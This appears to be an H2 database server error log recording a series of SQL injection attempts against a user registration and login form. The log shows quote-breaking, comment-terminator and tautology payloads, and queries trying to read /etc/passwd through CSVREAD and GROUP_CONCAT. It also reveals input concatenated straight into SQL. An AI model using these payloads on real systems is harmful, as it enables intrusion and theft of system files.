+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', ''', ''', '') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:11:57 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username=''[*]'"; SQL statement:
+SELECT * FROM users WHERE username=''' [42000-178]
+06-16 11:11:57 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', ''', ''', '') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:13:41 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username=''[*]'"; SQL statement:
+SELECT * FROM users WHERE username=''' [42000-178]
+06-16 11:13:41 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', ''', '')', '') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:13:42 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO users(role, username, password, ip) VALUES('user', 'aa', '')', '[*]')"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', 'aa', '')', '') [42000-178]
+06-16 11:13:49 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO users(role, username, password, ip) VALUES('user', 'aa', '','')', '[*]')"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', 'aa', '','')', '') [42000-178]
+06-16 11:13:50 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO users(role, username, password, ip) VALUES('user', 'aa', '','','')', '[*]')"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', 'aa', '','','')', '') [42000-178]
+06-16 11:13:51 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', 'aa', '','','')--', '') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:13:53 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO users(role, username, password, ip) VALUES('user', 'aa', '','','')#', '[*]')"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', 'aa', '','','')#', '') [42000-178]
+06-16 11:13:55 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', 'aa', '','','')--', '') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:14:23 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username='aa'[*]'"; SQL statement:
+SELECT * FROM users WHERE username='aa'' [42000-178]
+06-16 11:14:23 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO USERS(ROLE, USERNAME, PASSWORD, IP) VALUES('user', 'aa'', 'A[*]'', '') "; expected "[, ::, *, /, %, +, -, ||, ~, !~, NOT, LIKE, REGEXP, IS, IN, BETWEEN, AND, OR, ,, )"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', 'aa'', 'a'', '') [42001-178]
+06-16 11:14:43 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username='aa'[*]'"; SQL statement:
+SELECT * FROM users WHERE username='aa'' [42000-178]
+06-16 11:14:43 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', 'aa'', '',''', '') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:21:05 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting ; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', 'dwdw', ''or''='', '220.133.209.6') [22018-178]
+06-16 11:21:42 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO users(role, username, password, ip) VALUES('user', 'dwdw', ''or''=''', '220.133.209.6[*]')"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', 'dwdw', ''or''=''', '220.133.209.6') [42000-178]
+06-16 11:21:45 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username=''[*]'"; SQL statement:
+SELECT * FROM users WHERE username=''' [42000-178]
+06-16 11:21:45 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', ''', ''', '220.133.209.6') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:22:02 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username=''[*]'"; SQL statement:
+SELECT * FROM users WHERE username=''' [42000-178]
+06-16 11:22:02 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', ''', ''', '220.133.209.6') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:28:25 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Function "CVSREAD" not found; SQL statement:
+select CVSREAD('/etc/passwd') [90022-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.command.Parser.readJavaFunction(Parser.java:2326)
+	at org.h2.command.Parser.readFunction(Parser.java:2378)
+	at org.h2.command.Parser.readTerm(Parser.java:2712)
+	at org.h2.command.Parser.readFactor(Parser.java:2244)
+	at org.h2.command.Parser.readSum(Parser.java:2231)
+	at org.h2.command.Parser.readConcat(Parser.java:2201)
+	at org.h2.command.Parser.readCondition(Parser.java:2051)
+	at org.h2.command.Parser.readAnd(Parser.java:2023)
+	at org.h2.command.Parser.readExpression(Parser.java:2015)
+	at org.h2.command.Parser.parseSelectSimpleSelectPart(Parser.java:1927)
+	at org.h2.command.Parser.parseSelectSimple(Parser.java:1959)
+	at org.h2.command.Parser.parseSelectSub(Parser.java:1853)
+	at org.h2.command.Parser.parseSelectUnion(Parser.java:1674)
+	at org.h2.command.Parser.parseSelect(Parser.java:1662)
+	at org.h2.command.Parser.parsePrepared(Parser.java:434)
+	at org.h2.command.Parser.parse(Parser.java:306)
+	at org.h2.command.Parser.parse(Parser.java:278)
+	at org.h2.command.Parser.prepareCommand(Parser.java:243)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:28:29 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Function "CVSREAD" not found; SQL statement:
+select CVSREAD('/etc/passwd') [90022-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.command.Parser.readJavaFunction(Parser.java:2326)
+	at org.h2.command.Parser.readFunction(Parser.java:2378)
+	at org.h2.command.Parser.readTerm(Parser.java:2712)
+	at org.h2.command.Parser.readFactor(Parser.java:2244)
+	at org.h2.command.Parser.readSum(Parser.java:2231)
+	at org.h2.command.Parser.readConcat(Parser.java:2201)
+	at org.h2.command.Parser.readCondition(Parser.java:2051)
+	at org.h2.command.Parser.readAnd(Parser.java:2023)
+	at org.h2.command.Parser.readExpression(Parser.java:2015)
+	at org.h2.command.Parser.parseSelectSimpleSelectPart(Parser.java:1927)
+	at org.h2.command.Parser.parseSelectSimple(Parser.java:1959)
+	at org.h2.command.Parser.parseSelectSub(Parser.java:1853)
+	at org.h2.command.Parser.parseSelectUnion(Parser.java:1674)
+	at org.h2.command.Parser.parseSelect(Parser.java:1662)
+	at org.h2.command.Parser.parsePrepared(Parser.java:434)
+	at org.h2.command.Parser.parse(Parser.java:306)
+	at org.h2.command.Parser.parse(Parser.java:278)
+	at org.h2.command.Parser.prepareCommand(Parser.java:243)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:29:00 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Function "CVSREAD" not found; SQL statement:
+select * from cvsread('/etc/passwd') [90022-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.command.Parser.readJavaFunction(Parser.java:2326)
+	at org.h2.command.Parser.readFunction(Parser.java:2378)
+	at org.h2.command.Parser.readTableFilter(Parser.java:1204)
+	at org.h2.command.Parser.parseSelectSimpleFromPart(Parser.java:1859)
+	at org.h2.command.Parser.parseSelectSimple(Parser.java:1968)
+	at org.h2.command.Parser.parseSelectSub(Parser.java:1853)
+	at org.h2.command.Parser.parseSelectUnion(Parser.java:1674)
+	at org.h2.command.Parser.parseSelect(Parser.java:1662)
+	at org.h2.command.Parser.parsePrepared(Parser.java:434)
+	at org.h2.command.Parser.parse(Parser.java:306)
+	at org.h2.command.Parser.parse(Parser.java:278)
+	at org.h2.command.Parser.prepareCommand(Parser.java:243)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:29:59 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: The result set is not scrollable and can not be reset. You may need to use conn.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE, ..).; SQL statement:
+select group_concat(csvread('/etc/passwd')) [90128-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.tools.SimpleResultSet.beforeFirst(SimpleResultSet.java:247)
+	at org.h2.value.ValueResultSet.getString(ValueResultSet.java:96)
+	at org.h2.value.Value.convertTo(Value.java:827)
+	at org.h2.expression.Aggregate.updateAggregate(Aggregate.java:250)
+	at org.h2.command.dml.Select.queryGroup(Select.java:356)
+	at org.h2.command.dml.Select.queryWithoutCache(Select.java:641)
+	at org.h2.command.dml.Query.query(Query.java:323)
+	at org.h2.command.dml.Query.query(Query.java:291)
+	at org.h2.command.dml.Query.query(Query.java:37)
+	at org.h2.command.CommandContainer.query(CommandContainer.java:91)
+	at org.h2.command.Command.executeQuery(Command.java:197)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:181)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:30:01 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: The result set is not scrollable and can not be reset. You may need to use conn.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE, ..).; SQL statement:
+select group_concat(csvread('/etc/passwd')) [90128-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.tools.SimpleResultSet.beforeFirst(SimpleResultSet.java:247)
+	at org.h2.value.ValueResultSet.getString(ValueResultSet.java:96)
+	at org.h2.value.Value.convertTo(Value.java:827)
+	at org.h2.expression.Aggregate.updateAggregate(Aggregate.java:250)
+	at org.h2.command.dml.Select.queryGroup(Select.java:356)
+	at org.h2.command.dml.Select.queryWithoutCache(Select.java:641)
+	at org.h2.command.dml.Query.query(Query.java:323)
+	at org.h2.command.dml.Query.query(Query.java:291)
+	at org.h2.command.dml.Query.query(Query.java:37)
+	at org.h2.command.CommandContainer.query(CommandContainer.java:91)
+	at org.h2.command.Command.executeQuery(Command.java:197)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:181)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:30:59 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: The result set is not scrollable and can not be reset. You may need to use conn.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE, ..). [90128-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.tools.SimpleResultSet.beforeFirst(SimpleResultSet.java:247)
+	at org.h2.value.ValueResultSet.getString(ValueResultSet.java:96)
+	at org.h2.jdbc.JdbcResultSet.getString(JdbcResultSet.java:286)
+	at org.h2.server.pg.PgServerThread.writeDataColumn(PgServerThread.java:502)
+	at org.h2.server.pg.PgServerThread.sendDataRow(PgServerThread.java:487)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:400)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:31:42 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Scalar subquery contains more than one row; SQL statement:
+select GROUP_CONCAT(select * from csvread('/etc/passwd')) [90053-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.expression.Subquery.getValue(Subquery.java:42)
+	at org.h2.expression.Aggregate.updateAggregate(Aggregate.java:247)
+	at org.h2.command.dml.Select.queryGroup(Select.java:356)
+	at org.h2.command.dml.Select.queryWithoutCache(Select.java:641)
+	at org.h2.command.dml.Query.query(Query.java:323)
+	at org.h2.command.dml.Query.query(Query.java:291)
+	at org.h2.command.dml.Query.query(Query.java:37)
+	at org.h2.command.CommandContainer.query(CommandContainer.java:91)
+	at org.h2.command.Command.executeQuery(Command.java:197)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:181)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:31:43 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Scalar subquery contains more than one row; SQL statement:
+select GROUP_CONCAT(select * from csvread('/etc/passwd')) from dual [90053-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.expression.Subquery.getValue(Subquery.java:42)
+	at org.h2.expression.Aggregate.updateAggregate(Aggregate.java:247)
+	at org.h2.command.dml.Select.queryGroup(Select.java:356)
+	at org.h2.command.dml.Select.queryWithoutCache(Select.java:641)
+	at org.h2.command.dml.Query.query(Query.java:323)
+	at org.h2.command.dml.Query.query(Query.java:291)
+	at org.h2.command.dml.Query.query(Query.java:37)
+	at org.h2.command.CommandContainer.query(CommandContainer.java:91)
+	at org.h2.command.Command.executeQuery(Command.java:197)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:181)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:31:45 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Scalar subquery contains more than one row; SQL statement:
+select GROUP_CONCAT(select * from csvread('/etc/passwd')) from users [90053-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.expression.Subquery.getValue(Subquery.java:42)
+	at org.h2.expression.Aggregate.updateAggregate(Aggregate.java:247)
+	at org.h2.command.dml.Select.queryGroup(Select.java:356)
+	at org.h2.command.dml.Select.queryWithoutCache(Select.java:641)
+	at org.h2.command.dml.Query.query(Query.java:323)
+	at org.h2.command.dml.Query.query(Query.java:291)
+	at org.h2.command.dml.Query.query(Query.java:37)
+	at org.h2.command.CommandContainer.query(CommandContainer.java:91)
+	at org.h2.command.Command.executeQuery(Command.java:197)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:181)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:31:47 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Scalar subquery contains more than one row; SQL statement:
+select GROUP_CONCAT(select * from csvread('/etc/passwd')) [90053-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.expression.Subquery.getValue(Subquery.java:42)
+	at org.h2.expression.Aggregate.updateAggregate(Aggregate.java:247)
+	at org.h2.command.dml.Select.queryGroup(Select.java:356)
+	at org.h2.command.dml.Select.queryWithoutCache(Select.java:641)
+	at org.h2.command.dml.Query.query(Query.java:323)
+	at org.h2.command.dml.Query.query(Query.java:291)
+	at org.h2.command.dml.Query.query(Query.java:37)
+	at org.h2.command.CommandContainer.query(CommandContainer.java:91)
+	at org.h2.command.Command.executeQuery(Command.java:197)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:181)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:31:49 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT GROUP_CONCAT(SELECT * FROM CSVREAD('/etc/passwd') "; expected "AS, RIGHT, LEFT, FULL, INNER, JOIN, CROSS, NATURAL, ,, WHERE, GROUP, HAVING, UNION, MINUS, EXCEPT, INTERSECT, ORDER, OFFSET, FETCH, LIMIT, FOR, [, ::, *, /, %, +, -, ||, ~, !~, NOT, LIKE, REGEXP, IS, IN, BETWEEN, AND, OR, ORDER, SEPARATOR, )"; SQL statement:
+select GROUP_CONCAT(select * from csvread('/etc/passwd') [42001-178]
+06-16 11:31:51 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Scalar subquery contains more than one row; SQL statement:
+select GROUP_CONCAT(select * from csvread('/etc/passwd')) from users [90053-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.expression.Subquery.getValue(Subquery.java:42)
+	at org.h2.expression.Aggregate.updateAggregate(Aggregate.java:247)
+	at org.h2.command.dml.Select.queryGroup(Select.java:356)
+	at org.h2.command.dml.Select.queryWithoutCache(Select.java:641)
+	at org.h2.command.dml.Query.query(Query.java:323)
+	at org.h2.command.dml.Query.query(Query.java:291)
+	at org.h2.command.dml.Query.query(Query.java:37)
+	at org.h2.command.CommandContainer.query(CommandContainer.java:91)
+	at org.h2.command.Command.executeQuery(Command.java:197)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:181)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:31:52 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Scalar subquery contains more than one row; SQL statement:
+select GROUP_CONCAT(select * from csvread('/etc/passwd')) [90053-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.expression.Subquery.getValue(Subquery.java:42)
+	at org.h2.expression.Aggregate.updateAggregate(Aggregate.java:247)
+	at org.h2.command.dml.Select.queryGroup(Select.java:356)
+	at org.h2.command.dml.Select.queryWithoutCache(Select.java:641)
+	at org.h2.command.dml.Query.query(Query.java:323)
+	at org.h2.command.dml.Query.query(Query.java:291)
+	at org.h2.command.dml.Query.query(Query.java:37)
+	at org.h2.command.CommandContainer.query(CommandContainer.java:91)
+	at org.h2.command.Command.executeQuery(Command.java:197)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:181)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:31:56 jdbc[3]: exception
